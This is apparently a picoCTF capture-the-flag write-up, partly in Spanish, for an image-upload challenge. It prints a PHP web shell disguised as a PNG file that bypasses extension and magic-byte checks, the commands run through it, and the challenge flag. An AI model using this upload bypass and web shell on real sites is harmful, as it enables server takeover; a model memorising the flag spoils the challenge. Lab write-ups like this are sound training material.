## Descripcion
I found a web app that can help process images: PNG images only!

Try it [here](http://atlas.picoctf.net:57317/)!
## solucion 
```

atlas.picoctf.net:57317/robots.txt ////////////////////////////////
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/


atlas.picoctf.net:57317/instructions.txt //////////////////////////
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.

archivo 
webshell.png.php

PNG
<?php system($_GET['cmd']); ?>


al subir el archivo no mostrara lo siguiente
File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully

ahora a la url del reto luego del puerto añadiremos lo siguiente
/uploads/webshell.png.php?cmd=ls -la ../


y nos motrara algo haci
PNG total 16 drwxrwxrwt 1 www-data www-data 21 Mar 11 2024 . drwxr-xr-x 1 root root 18 Nov 21 2023 .. -rw-r--r-- 1 root root 49 Mar 11 2024 MFRDAZLDMUYDG.txt -rw-r--r-- 1 root root 1572 Feb 7 2024 index.php


y ese txt parece prometedor haci que con 
/uploads/webshell.png.php?cmd=cat ../MFRDAZLDMUYDG.txt

y encontramos la bandera
PNG /* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03} */


```

```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}
```
## notas adicionales
revisar robots.txt siempre quien sabe que encontremos
## referencias
